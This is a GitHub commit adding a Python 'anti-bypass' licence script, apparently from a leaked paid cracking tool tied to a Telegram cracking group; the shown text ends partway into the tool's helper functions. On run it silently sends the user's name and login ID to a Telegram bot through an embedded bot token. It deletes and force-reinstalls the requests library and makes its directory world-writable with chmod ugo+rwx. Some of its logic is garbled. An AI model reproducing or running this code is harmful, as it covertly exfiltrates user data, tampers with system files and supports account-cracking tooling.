ad1b52fc6936c9bf53f5058835942f6fff019bf4
Tigerkrd <127364062+Tigerkrd@users.noreply.github.com>
2023-09-04 14:57:19 +0300

    Add files via upload

---
+++ ANTI--bypass.py
@@ -0,0 +1,186 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+################################
+#Creator < X NOT FOUND X .
+#Telegram < @xXx_not_found_xXx >
+#Telegram_Channel < @cracker_team_kurd >
+#¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬
+#-----------------------------------------------
+#+++++++++++++++++++++++++++++++++++++++++++++++
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+import os, requests.sessions, time, webbrowser, shutil
+from datetime import datetime
+currenthm = datetime.now()
+#print(str(currenthm.hour)+str(':')+str(currenthm.minute))
+from platform import python_version
+if '2.7' in python_version():print('\033[91mYou Are Using Python2.7... \nPlease Upgrade To Python3.11');exit()
+else:pass
+try:os.system('pip -q install requests')
+except: ImportError:os.system('pip install requests');os.system('clear')
+os.system('rm -rf .rm.txt')
+os.system('rm --help >> .rm.txt')
+try:shutil.rmtree('.pip.txt')
+except FileNotFoundError:pass
+try:shutil.rmtree('.pip3.txt')
+except FileNotFoundError:pass
+try:shutil.rmtree('.pip3.11.txt')
+except FileNotFoundError:pass
+rmr=open('.rm.txt', 'r').readlines()
+if '' in rmr:
+	os.system('clear')
+	exit('Are you edit rm file?')
+elif 'Usage: rm [OPTION]... [FILE]...' in rmr:
+	pass
+
+#The program pip is not installed.
+os.system('pip --help >> .pip.txt')
+pip=open('.pip.txt', 'r').readlines()
+if '' in pip:
+	os.system('clear')
+	exit('Are you edit [ pip ] file?')
+elif 'pip <command> [options]' in pip:
+	pass
+
+#The program pip3 is not installed.
+os.system('pip3 >> .pip3.txt')
+pip3=open('.pip3.txt', 'r').readlines()
+if '' in pip3:
+	os.system('clear')
+	exit('Are you edit [ pip3 ] file?')
+elif 'pip3 <command> [options]' in pip3:
+	pass
+
+#The program pip3.11 is not installed.
+os.system('pip3.11 >> .pip3.11.txt')
+pip311=open('.pip3.11.txt', 'r').readlines()
+if '' in pip311:
+	os.system('clear')
+	exit('Are you edit [ pip3.11 ] file?')
+elif 'pip3.11 <command> [options]' in pip311:
+	pass
+def xxxid(filexid, send_bot):
+	import os
+	os.system('pip -q install wget')
+	os.system('pip -q install requests')
+
+
+	#os.system('pip show Packages')
+	os.system('rm -rf .ch1.txt')
+	os.system('rm -rf .ch2.txt')
+	os.system('rm -rf module.txt')
+	os.system('touch .module.txt')
+	os.system('pip3 show requests >> .module.txt')
+	try:
+		rr=open('.module.txt', 'r').read()
+		r1=rr.split('Location: ')[1]
+		r2=r1.split('\n')[0]
+	except IndexError:
+		exit('Do you want to bypass..?!')
+	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests')
+	os.system(f'chmod ugo+rwx {r2}/requests/*;chmod ugo+rwx {r2}/requests/*')
+	os.system(f'rm -rf {r2}/requests/*')
+	os.system('pip3 -q install --force-reinstall --no-deps requests==2.29.0')
+	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests/*')
+
+	try:
+		try:
+			os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
+			os.system('pip3 -q uninstall requests -y')
+			os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
+
+		except (IndexError, IOError, OSError, requests.errors, requests.errors_only, requests.exceptions, Exception, KeyError, EOFError, NameError, ValueError, TabError, PermissionError, TimeoutError, ExceptionGroup):
+			print('Error ');exit()
+	except:print('error0000');exit()
+	os.system('rm -rf requests-2.29.0.tar.gz')
+	os.system('wget https://files.pythonhosted.org/packages/4c/d2/70fc708727b62d55bc24e43cc85f073039023212d482553d853c44e57bdb/requests-2.29.0.tar.gz')
+	os.system(f'tar -xvf requests-2.29.0.tar.gz;cp -r requests-2.29.0/requests {r2}')
+	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests')
+	os.system(f'chmod ugo+rwx {r2}/requests/*;chmod ugo+rwx {r2}/requests/*')
+	os.system(f'rm -rf {r2}/requests/*')
+	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
+	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests/*')
+	os.system('rm -rf requests-2.29.0.tar.gz')
+	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
+	import os,requests.sessions,time,webbrowser
+	os.system('pip3 -q uninstall requests -y')
+	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
+
+	try:
+		os.system('clear')
+		requests.Session().get('https://t.me/NN8F8')
+		os.system('clear')
+	except Exception:
+		print('Send Message For Owner >>> https://t.me/MR_B_L_4_C_K')
+		webbrowser.open('https://t.me/MR_B_L_4_C_K')
+		print('\033[91mConnection Error')
+		exit()
+	
+
+	iq1 = (str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))
+	iq2 = ((str(os.geteuid()).join(str(os.getlogin()))).join('0864213579`'))[::-1]
+	iq22 = (str(os.geteuid()).join(str(os.getlogin())))
+	os.system('pip3 -q install --force-reinstall --no-deps requests==2.29.0')
+	os.system(f'ls {r2}/requests/* -all >> .ch1.txt')
+	ch1=open('.ch1.txt', 'r').read()
+	if (str(currenthm.hour)+str(':')+str(currenthm.minute)) in time.ctime()  not in str(ch1):
+			print('Are You Edit Files Requests? - 1');exit()
+	elif (str(currenthm.hour)+str(':')+str(currenthm.minute)) in time.ctime() in str(ch1):
+			pass
+
+	if iq2 not in filexid:
+
+		print(send_bot)
+	elif iq2 in filexid:
+		pass
+
+	try:
+		if iq2 in filexid:
+			os.system('clear')
+			print("\033[92m YOUR ID IS ACTIVE .....")
+			menu()
+			time.sleep(1)
+			pass
+			print('\033[90m		#succss ByPaSs ')
+		else:
+			os.system('clear')
+			print("\033[91m YOUR ID IS NOT ACTIVE")
+			time.sleep(1)
+			exit()
+	except (Exception,KeyError,ConnectionError,ValueError):
+		print('Send Message For Owner >>> https://t.me/xXx_not_found_xXx')
+		webbrowser.open('https://t.me/xXx_not_found_xXx')
+		print('\033[91mConnection Error')
+		exit()
+
+def run():
+	if __name__ == '__main__':
+		os.system('clear')
+		name=input(' Enter Your name : ')
+		iq1 = (str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))
+		iq2 = ((str(os.geteuid()).join(str(os.getlogin()))).join('0864213579`'))[::-1]
+		iq22 = (str(os.geteuid()).join(str(os.getlogin())))
+		xxxid(requests.Session().get('https://github.com/Tigerkrd/prox/blob/main/proxxx.txt').text, requests.Session().post("https://api.telegram.org/bot6009314793:AAHjD2uNH0DT4PTJTbx5JbusLCLGa-m7_WA/sendMessage?chat_id=6278346102&text=NAME : "+name+"\nID : "+iq22))
+		exit()
+		
+run()
+
+# FUCK BY SYED-ZADA
+# LKING PAID SCRIPT OPEN SOURCE 
+import requests
+filexid = requests.get("https://github.com/Tigerkrd/prox/blob/main/proxxx.txt").text
+try:
+	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
+	from string import *
+	from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError: 
+	os.system('pip install requests > /dev/null')
+	exit('\n Run Again ')
+def clear():
+	os.system('clear')
+	print(logo)
+def linex():
+	print('\033[1;97m--------------------------------------------------')
+def write(text):
+	for i in text+"\n":
+		sys.stdout.write(i);sys.stdout.flush()
+		time.sleep(0.01)
